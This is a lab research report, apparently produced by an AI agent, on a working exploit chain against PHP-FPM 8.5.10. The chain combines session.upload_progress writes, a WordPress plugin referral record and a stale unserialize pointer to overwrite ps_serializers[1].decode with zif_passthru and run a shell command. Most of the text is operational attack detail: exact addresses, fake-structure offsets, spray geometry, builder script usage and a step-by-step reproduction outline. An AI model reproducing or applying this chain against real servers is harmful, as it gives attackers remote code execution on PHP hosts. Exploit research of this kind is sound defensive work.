# Stock `session.upload_progress` write primitive: limits, controllability, and the 8.5.10 `ps_serializers[].decode` → `zif_passthru` chain

Receipt: `/tmp/opencode/research/uploadprog_20261022T014518Z/`
Date: 2026-10-22
Lab: private `realapps` PHP-FPM tree at `/tmp/opencode/research/realchain_20261022T015900Z`
Status: completed. No repository commit. Shared services were not restarted; only lab workers were killed/respawned for lab hygiene.

## 1. Summary

The stock `session.upload_progress` primitive can write a session file of **8,388,711 bytes** (progress key **8,388,349 bytes**, HTTP 200). The key is stored **raw and contiguous** at file offset 16 (pure progress record) or 39 (combined two-record file). The maximum is not a session-engine limit: it is the request-body limit, exactly **8,388,608 bytes** in this lab (`nginx client_max_body_size 8m` and PHP `post_max_size=8M`). A key of 8,388,400 bytes produced HTTP 413 and no session file.

Byte control is sufficient for the fake-structure payload: NUL bytes survive; arbitrary key bytes are copied contiguously; only `|` (0x7C) is rejected because it is the `php` serializer's record delimiter, and a key containing it makes the session file **0 bytes**. With `session.upload_progress.cleanup=On` the progress record is removed at request end and the file is left **0 bytes** (not unlinked); with `cleanup=0` the record persists for the next request.

The chain was executed successfully. The upload-progress writer supplied the large fake-structure record, the HexCoupon referrer writer supplied the required first integer record `referrer_id|i:10731636;` (the decimal value of `zif_passthru`), and the plant left a stale `BG(unserialize)={data=P, level=1}`. The final trigger was sent **without gdb**, with ASLR on. The final request returned HTTP 500 with an empty body, created `MARK_UP`, left the session file at 0 bytes, and the worker survived. The final worker state was `basic_globals.unserialize={data=0x0, level=0}` and `ps_serializers[1].decode=0xa3c074` (static poison).

**Stock-only blocker:** the stock progress primitive alone cannot write the first record's integer value. Its key cannot contain `|`, so it cannot produce `name|i:<value>;` as a prior record, and its own record is always a progress array. In this lab the HexCoupon `handle_referral()` write (`GET /?ref=10731636`) supplied that integer record. Nothing else about the primitive blocked the chain.

## 2. Environment

| Item | Value |
|---|---|
| Target | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm` |
| Binary type | ELF 64-bit `EXEC` (non-PIE), x86-64 |
| Binary md5 | `4ee099823b75e16ea36f93c71d57bfd8` |
| PHP | 8.5.10 |
| FPM master | `958304` |
| HTTP | nginx 1.30.1 on `127.0.0.1:28893` |
| ASLR | `/proc/sys/kernel/randomize_va_space = 2` |
| Session handler | `files`, `session.serialize_handler=php` |
| Session path | `.../www/wp-content/uploads/sessions` (web-served) |
| Session strict mode | `0` |
| Upload progress | `enabled=1`, `cleanup=0`, `freq=1`, `min_freq=0` |
| `post_max_size` | `8M` |
| `memory_limit` | `512M` |
| nginx body cap | `client_max_body_size 8m` |
| `ps_serializers[1].decode` | `0x22c54c8` |
| `zif_passthru` | `0xa3c074` (decimal `10731636`) |
| `basic_globals` | `0x22d1c60` |

The normal trigger endpoint is `/uptrigger.php` (`session_start(); echo "UPTRIGGER_OK\n";`). The no-app-session writer target is `/diag_params.php`; the cleanup test target is `/upcleanup/diag.php` with a `.user.ini` containing `session.upload_progress.cleanup=On`. The plant endpoint is `/wp-content/uploads/plant/hexplant.php`.

## 3. Primitive and file layout

A multipart POST with:

```text
PHP_SESSION_UPLOAD_PROGRESS = <key>
f = <file part>; filename=<name>
Cookie: PHPSESSID=<sid>
```

causes PHP to create/update the session file with one progress variable:

```text
upload_progress_<KEY>|a:5:{s:10:"start_time";i:...;s:14:"content_length";i:<body>;s:15:"bytes_processed";i:<body>;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{...}}}
```

The key starts at file offset 16 (`len("upload_progress_")`). It is written without escaping and without a length prefix: the serializer finds the first `|` to terminate the variable name. Consequently the whole key is one contiguous byte range in the session file, and a `|` anywhere in it terminates the name early and makes session encoding fail (file 0 bytes). NUL is not special to this writer and is preserved.

For the two-record chain file the layout is:

```text
referrer_id|i:10731636;upload_progress_<KEY>|a:5:{...}
^ 23 bytes             ^ key starts at file offset 39
```

The first record is 23 bytes. The progress key then begins at file offset 39. Both records are in one file because the same `PHPSESSID` is used for both writes.

## 4. Maximum write size

All size probes used a 16-byte filename and one file part. `Key` is the `PHP_SESSION_UPLOAD_PROGRESS` value length; `Body` is the complete multipart body length; `File` is the resulting session file size.

| Key | Body | HTTP | Session file |
|---:|---:|---:|---:|
| 1,000 | 2,243 | 200 | 2,342 (1,000-byte key + 1,000-byte filename baseline) |
| 65,536 | 65,795 | 200 | 65,894 |
| 262,144 | 262,403 | 200 | 262,504 |
| 388,000 | 388,259 | 200 | 388,360 |
| 524,288 | 524,547 | 200 | 524,648 |
| 1,048,576 | 1,048,835 | 200 | 1,048,938 |
| 2,097,152 | 2,097,411 | 200 | 2,097,514 |
| 4,194,304 | 4,194,563 | 200 | 4,194,666 |
| 7,000,000 | 7,000,259 | 200 | 7,000,362 |
| 8,300,000 | 8,300,259 | 200 | 8,300,362 |
| 8,350,000 | 8,350,259 | 200 | 8,350,362 |
| 8,380,000 | 8,380,259 | 200 | 8,380,362 |
| 8,388,000 | 8,388,259 | 200 | 8,388,362 |
| **8,388,349** | **8,388,608** | **200** | **8,388,711** |
| 8,388,400 | 8,388,659 | 413 | absent |
| 8,390,000 | 8,390,259 | 413 | absent |

The largest accepted body is exactly 8,388,608 bytes (8 MiB). nginx rejected the next body by 51 bytes with `413 Request Entity Too Large`; no PHP session file was created. The session file is 362 bytes larger than the key at this size because the serialized progress value and delimiters add 362 bytes (16-byte prefix + `|` + 345-byte value).

The effective maximum is therefore a **body-size limit**, not a session serializer limit. Raising `client_max_body_size`/`post_max_size` should raise the key/file ceiling until PHP memory or disk limits intervene; that was not tested because both caps were already 8 MiB in this lab. The chain needs only about 1.5 MB, so the 8 MiB cap is not a blocker.

Evidence: `cycles/up*.json`, `cycles/big*.json`, `cycles/mx*.json`, `cycles/bd8388349.json`, `cycles/bd8388400.json`.

## 5. Controllability

### 5.1 Raw and contiguous

For every size probe, the key was byte-for-byte present at file offset 16 with `key_contiguous=True` and `key_first_diff=None`. The 8,388,349-byte maximum retained the entire key; the first 220 bytes and the value tail matched the expected serialization. The file is readable over HTTP (`GET /wp-content/uploads/sessions/sess_<sid>`) with status 200 and the same length while `cleanup=0`.

### 5.2 NUL and `|`

- NUL: key `AAA\x00BBB\x00CCC` produced a 365-byte file whose key at offset 16 contains all three NUL bytes. NUL is copied as data; it does not truncate the key.
- `|` (0x7C): key `AAA|BBB` produced a **0-byte** file. PHP's `php` serializer treats the first `|` as the name delimiter, so the oversized/invalid name is not written and session encoding fails. The warning is the serializer's "Failed to write session data. Data contains invalid key" path. This is the one byte value the key cannot contain.
- High bytes / arbitrary binary other than `0x7C`: not separately fuzzed. The writer uses length-based copies (`ZSTR_LEN`), so no other byte is expected to be special; the measured NUL and `|` cases are the relevant constraints for the chain.

### 5.3 Filenames

Filenames are serialized **values**, not keys: `s:<len>:"<name>"`. They are length-prefixed, so the delimiter/truncation rules for keys do not apply to them. Tested filename lengths:

| Filename length | Session file |
|---:|---:|
| 65,536 | 65,897 |
| 262,144 | 262,508 |
| 1,048,576 | 1,048,943 |

The long-filename probes used a 16-byte key and one file part; the file is roughly `namelen + 367` bytes. A filename containing `|` would be inside a length-prefixed string and is structurally data, not a record delimiter; this was not separately exercised because the chain puts its fake structures in the key, not in the filename. Multiple file parts were not needed: the key alone reached the 8 MiB body cap, so filename/multiple-file workarounds for a short key were unnecessary.

Evidence: `cycles/upN.json`, `cycles/upP.json`, `cycles/fn65536.json`, `cycles/fn262144.json`, `cycles/fn1048576.json`.

## 6. Cleanup, lifetime, and locking

### 6.1 `cleanup=On` (stock default)

The pool sets `cleanup=0`; `/upcleanup/.user.ini` sets `session.upload_progress.cleanup=On` and overrides the pool value (`ini_get` returned `1`). After a completed upload request:

- the progress variable is removed from `$_SESSION`;
- the session file remains on disk but is **0 bytes** (empty session encoding), not unlinked;
- the file is served as 0 bytes.

Observed `cycles/cln1.json`: HTTP 200, `cleanup=1 enabled=1 freq=1`, session file 0 bytes, SHA256 of empty file. A second request cannot use the progress record.

### 6.2 During the upload

With a 7,000,000-byte file part and `cleanup=On`, a polling reader sampled the session file 28 times over the request. Sizes seen were `-1` (not yet created), `0`, `1319`, `1321`, `1323`; 20 samples were non-zero, first at about 20 ms into the request, last just before completion, then 0. The progress record was therefore readable while the request was in flight, but only for a short window (roughly 20 ms here) and then erased. `cycles/pd1.json`.

### 6.3 `cleanup=0` and the chain

`cleanup=0` is required for a two-request writer → trigger sequence: the progress record must survive the writer request. With `cleanup=0` the full file (including the 8,388,711-byte maximum) persisted and was served over HTTP with status 200.

### 6.4 Locking

No filesystem-level lock prevented direct reads of the session file during or after the upload: the polling reader observed the file growing while the request was active. PHP's per-request session lock (`flock` on the session file) was not separately benchmarked against a concurrent `session_start()`. Operationally, the trigger must be sent **after** the writer request has completed, because the final session encode and any cleanup happen at request shutdown. The successful chain used strictly sequential requests.

## 7. Required first record: HexCoupon referrer

The progress record is always `upload_progress_<key>|a:5:{...}`. It cannot supply the chain's first typed integer value because its key cannot contain `|`. The HexCoupon referral handler supplies it:

```text
GET /?ref=10731636
Cookie: PHPSESSID=ref2
```

Response: HTTP 302. Session file: exactly 23 bytes, SHA256 `ec98630ace299fa1c42554e2e2e84434aa97cf4b775606c4b67582abd7484232`:

```text
referrer_id|i:10731636;
```

`10731636` is `0xa3c074`, the realapps `zif_passthru` address. That integer is the typed value written through the fake dtor entry into `ps_serializers[1].decode`.

The combined writer was verified with the same SID: `referrer_id|i:10731636;` followed by a 65,536-byte progress key. Result: 65,917 bytes, key at file offset 39, `pipe_count=2`, value tail a normal progress array (`cycles/ref2.json`). The first record was preserved by the progress request's session read/modify/write.

## 8. Chain geometry and execution

### 8.1 Plant

`/wp-content/uploads/plant/hexplant.php` creates the real `LoyaltyProgramHelpers` object without its constructor, lowers `memory_limit` to 2M, and calls the real `start_session()`. A 1 MB session value (long filename) is decoded until OOM. The OOM occurs after RINIT and leaves:

```text
basic_globals.unserialize = {data = P, level = 1}
P = 0x7f791b188000
```

The plant worker survived and the plant session file was deleted by the endpoint. P was deterministic across the three workers tested (`1682756`, `1683672`, `1685915`). `P` is page-aligned; this is the stale `php_unserialize_data` pointer reused by the next session decode.

### 8.2 Trigger session

The successful trigger file is `cycles/trigger_tR3.pretrigger.bin`, **1,500,388 bytes**, built by `mkup_trigger.py` with:

```text
X1 = 0x7f791b06a000      (first decode buffer)
X2 = 0x7f791aa01000      (second decode buffer)
F  = 0x7f791aa01218      (fake zend_execute_data / arg1 zend_string)
TARGET = 0x22c54c8       (ps_serializers[1].decode)
CMD = "touch /tmp/opencode/research/uploadprog_20261022T014518Z/MARK_UP;"
```

The key is 1,500,000 bytes; with the 23-byte first record and the appended progress value, the file is 1,500,388 bytes. The key contains:

- fake `zend_execute_data` fields at file offsets `0x2c`, `0x50`, `0x58` (key offsets 5, 0x29, 0x31): `num_args=1`, `arg1=F`, type `6` (IS_STRING);
- a fake `zend_string` at file offset `0x200` (key offset 0x1d9): length 65 at `+0x10`, command at `+0x18`;
- a large spray of fake `php_unserialize_data`/`var_dtor_entries` blobs, one per page-aligned P candidate, covering `P` from `0x7f791b080000` to `0x7f791b1e0000` (344 variants; 8 candidates beyond the key end were skipped; one candidate containing `0x7C` was skipped).

For each candidate P, the 0x98-byte blob is written at file offset `P - X1 - 24` (key offset minus 39). Its fake dtor `used_slots` is:

```text
used = (0x22c54c8 - (P + 0x88 + 0x10)) / 16
```

For the successful `P = 0x7f791b188000`, this is `-8759880368829` (`0xfffff8086e713d43`). The negative index makes `var_dtor_hash->data[used]` land exactly on `ps_serializers[1].decode`; the serializer's typed write stores the first record's value `0xa3c074` there. Because `used_slots` is negative, `var_destroy` performs zero dtor iterations, and `php_var_unserialize_destroy` decrements level 2→1, preserving the stale P for the fake decode.

### 8.3 gdb measurement

`cycles/trig_real2.gdb.log` (worker 1683672) records:

```text
DECODE n=1 data=0x7f791b06a000 val=0x7f791b06a018 len=1500388
DECODE n=2 data=0x7f791aa01000 val=0x7f791aa01018 len=1500703
ZIF rdi=0x7f791aa01018 rsi=1500703 numargs=1 arg=0x7f791aa01218 type=6
ARG 0x7f791aa01218 len=65 cmd=0x7f791aa01230: "touch .../MARK_UP;"
```

The request returned HTTP 500 with an empty body and the session file was 0 bytes; gdb detached at the passthru breakpoint. Worker survival after the final no-gdb request is measured separately below.

The first gdb attempt (`cycles/trig_real1.gdb.log`, worker 1682756) exposed the NUL-termination precondition: declared length 65, but the bytes at `F+0x18` continued with 135 `A` bytes before a NUL, so `strlen(F+0x18)=200 != 65`. `zif_passthru` took the `zend_wrong_parameter_error` path and the worker died (HTTP 502). The fix is to write a NUL at `key[0x1f1+65]` (exactly at the declared end), which `mkup_trigger.py` now does. `zif_passthru` calls `php_exec_ex`; that function validates `strlen(cmd)==declared_len` before executing.

### 8.4 Final no-gdb run

The final request was sent at 2026-10-22T01:58:55Z (03:58:55 +0200) with no gdb, no ptrace, ASLR on:

```text
POST /uptrigger.php
Cookie: PHPSESSID=tR3
multipart body: 267 bytes (progress key "x" + one file part)
```

Result (`cycles/final_up.json`, `cycles/final_up.start`, `cycles/final_up.end`):

```text
HTTP 500, empty body, 0.004 s
session file sess_tR3 = 0 bytes
MARK_UP created: size 0, mtime 2026-10-22 03:58:55.685881987 +0200
worker before: 1685915
worker after:  1685915 (survived)
```

Post-run read-only gdb (`cycles/state_final_up.out`):

```text
basic_globals.unserialize = {data = 0x0, level = 0}
ps_serializers[1].decode  = 0xa3c074
```

The HTTP 500/empty body is the post-exploitation shutdown path, not a failed marker: the marker exists and the session was consumed. The static `decode` slot remains poisoned in the worker after success; this is worker-local `.data`, not a file artifact.

## 9. Limits and blockers

| Question | Result |
|---|---|
| Maximum session bytes from stock progress write | **8,388,711** at key 8,388,349, body 8,388,608, HTTP 200 |
| Next tested size | key 8,388,400, body 8,388,659 → HTTP 413, no file |
| Limiter | 8 MiB request-body cap (`client_max_body_size 8m`, `post_max_size=8M`), not serializer |
| Key contiguity | Raw, contiguous at file offset 16 (pure) / 39 (combined); NUL preserved; no escaping |
| Forbidden key byte | `|` (0x7C) → session file 0 bytes |
| Filename length | Length-prefixed value; tested up to 1,048,576 bytes; not a key delimiter |
| Cleanup default | On: progress record removed, file left 0 bytes (not unlinked); cross-request persistence impossible |
| Cleanup for chain | `cleanup=0`; file persists and is HTTP-readable |
| Locking | No filesystem lock blocked reads during upload; PHP session lock not separately benchmarked; writer must finish before trigger |
| Minimum chain session | Structural lower bound **1,171,933 bytes** for the measured P/X1 (key 1,171,545 + 23-byte record + progress value); demonstrated **1,500,388 bytes** |
| Chain result | **Success**, no gdb, ASLR on; MARK_UP; worker survived; static poison `0xa3c074` |
| Stock-only blocker | Cannot write the first `name|i:<value>;` record; HexCoupon referrer supplies `i:10731636` |

### 9.1 Minimum size derivation

With `X1=0x7f791b06a000` and `P=0x7f791b188000`, the fake blob starts at file offset `0x11dfe8` and key offset `0x11dfc1`. A 0x98-byte blob therefore needs a key of at least `0x11dfc1 + 0x98 = 1,171,545` bytes. With the 23-byte first record (`39` bytes before the key), one `|`, and the 348-byte progress value observed for this file, the smallest session that can carry the structures is:

```text
39 + 1,171,545 + 1 + 348 = 1,171,933 bytes
```

This is a structural bound, not a demonstrated run: `X1` is request/file-size dependent (measured at `0x7f791b06a000` in the final trigger and `0x7f791b06b000` in some size probes), so lowering the file changes the address relation. The demonstrated working size is 1,500,388 bytes, which sprays 344 page-aligned P candidates and tolerates that variation. The chain's hard requirement is therefore on the order of 1.2 MB, comfortably below the 8 MiB stock cap.

### 9.2 Exact missing property if only the stock primitive is used

The stock `session.upload_progress` write cannot produce a record whose **value** is an attacker-chosen integer before its own progress array. Its key is the variable name and cannot contain `|`; its value is always the fixed progress array. The chain needs a first record of the form `name|i:<target>;` so that the typed zval write through the fake dtor stores `zif_passthru` (`0xa3c074`) into `ps_serializers[1].decode`. In this lab that record came from HexCoupon `handle_referral()`. Without an equivalent app-level integer writer, the stock primitive alone is missing **the controlled first integer record**, not size, contiguity, or byte control.

## 10. Reproduction outline

1. Ensure the lab pool has `session.upload_progress.cleanup=0`, `enabled=1`, writable/served `session.save_path`, and `use_strict_mode=0`.
2. Write the first record: `GET /?ref=10731636` with `Cookie: PHPSESSID=<sid>`; confirm `sess_<sid>` is exactly `referrer_id|i:10731636;` (23 bytes).
3. Build the trigger key with `mkup_trigger.py X1 KEYLEN PLO PHI F OUT CMD`; use a key large enough to cover the P candidates (1.5 MB in the successful run). The builder rejects `|` and writes the frame, zend_string, and fake dtor spray.
4. Upload it to `/diag_params.php` with `PHP_SESSION_UPLOAD_PROGRESS` set to the key bytes/filename and the same `PHPSESSID`; confirm the file is 1,500,388 bytes and the key starts at offset 39.
5. Plant the stale pointer: request `/wp-content/uploads/plant/hexplant.php` with the same SID and a ~1 MB session value; confirm P=`0x7f791b188000`, `{data=P, level=1}`, and worker survival.
6. Trigger with a small multipart POST to `/uptrigger.php` (same SID). No gdb. Expect HTTP 500/empty, `MARK_UP`, session file 0 bytes, and worker survival.
7. After the run, the worker's `ps_serializers[1].decode` remains `0xa3c074`; kill that worker to clear the poison and let the master respawn a clean child.

## 11. Evidence map

| Path | Contents |
|---|---|
| `cycles/upA.json`, `cycles/up*.json`, `cycles/big*.json`, `cycles/mx*.json`, `cycles/bd*.json` | size, HTTP, file state, key contiguity, hashes |
| `cycles/upN.json`, `cycles/upP.json` | NUL preservation, `|` rejection |
| `cycles/fn*.json` | long filename values |
| `cycles/cln1.json`, `cycles/pd1.json` | cleanup=On final state, in-flight polling |
| `cycles/ref1.hdr`, `cycles/upref1.json`, `cycles/ref2.json` | HexCoupon 302/23-byte record, baseline progress write, combined two-record file |
| `cycles/key_tR2.bin`, `cycles/key_tR2.bin.json` | 1,500,000-byte trigger key and builder metadata |
| `cycles/trigger_tR3.pretrigger.bin` | exact 1,500,388-byte trigger session |
| `cycles/create_tR3.json` | trigger session creation response/size |
| `cycles/trig_real1.gdb.log`, `cycles/trig_real2.gdb.log` | ZIF/frame/command measurements; NUL precondition |
| `cycles/trig_real2.json`, `cycles/final_up.json` | gdb and final no-gdb HTTP results |
| `cycles/final_up.start`, `cycles/final_up.end` | final request timestamps |
| `cycles/state_final_up.out`, `cycles/state_after_respawn.out`, `cycles/state_after_respawn.http` | post-run `basic_globals` / static poison; clean respawned worker state and HTTP check |
| `MARK_UP` | final marker (0 bytes) |
| `mkup_trigger.py`, `upmp.py`, `probe_up.py`, `poll_during.py` | builders and probes |
| `cycles/php_exec_ex.asm` | disassembly of the `php_exec_ex` length check |

The `SHA256SUMS` file in this directory lists every evidence file. No repository commit was made. The lab's shared services were not restarted; only the poisoned lab worker was killed for worker-local `.data` hygiene.

## 12. Lab hygiene

The final worker `1685915` was alive with the success evidence captured (`state_final_up.out`). Because `ps_serializers[1].decode=0xa3c074` persists in that worker, it was killed after evidence capture so master `958304` could respawn a clean child. Master `958304` respawned worker `1694708`; a read-only check on the new child (`state_after_respawn.out`) shows `basic_globals.unserialize={data=0x0, level=0}` and `ps_serializers[1].decode=0x9e6fae` (clean). The clean child handled `GET /uptrigger.php` with `PHPSESSID=postclean` as HTTP 200 `UPTRIGGER_OK` (0-byte session) and remained alive. The marker, the 0-byte `sess_tR3`, the pretrigger file, and all cycle JSON/logs were left in place. The master process was not restarted.
